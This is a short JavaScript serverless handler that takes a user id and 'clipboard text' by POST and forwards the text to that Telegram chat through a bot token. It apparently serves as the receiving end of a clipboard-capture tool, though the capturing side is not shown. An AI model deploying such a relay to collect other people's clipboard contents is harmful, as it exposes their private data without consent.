export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).send("Only POST allowed");

  const { uid, text } = req.body;
  const botToken = process.env.BOT_TOKEN;

  if (!uid || !text) {
    return res.status(400).json({ error: "Missing uid or text" });
  }

  // 🕒 د وخت تولید
  const now = new Date();
  const timeString = now.toLocaleString("en-GB", {
    timeZone: "Asia/Kabul",
    hour12: true,
    weekday: "short",
    year: "numeric",
    month: "short",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit"
  });

  // 📩 مسیج جوړول
  const message =
    `*╭━━━⫸ Clipboard Text Received ⫷━━━╮*\n\n` +
    `📌 *User ID:* \`${uid}\`\n` +
    `🕒 *Time:* ${timeString}\n\n` +
    `📝 *Text:*\n${text}\n\n` +
    `*╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯*\n\n` +
    `──────╮\n` +
    `│ 🧑🏻‍💻 *Built By:* 💛 *WACIQ*\n` +
    `╰────────────╯`;

  // 📤 Telegram ته لیږل
  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: uid, // ← هماغه یوزر ته واستوي
      text: message,
      parse_mode: "Markdown"
    })
  });

  const data = await response.json();

  if (!data.ok) {
    return res.status(500).json({ error: "Failed to send message", details: data });
  }

  res.status(200).json({ ok: true });
} 
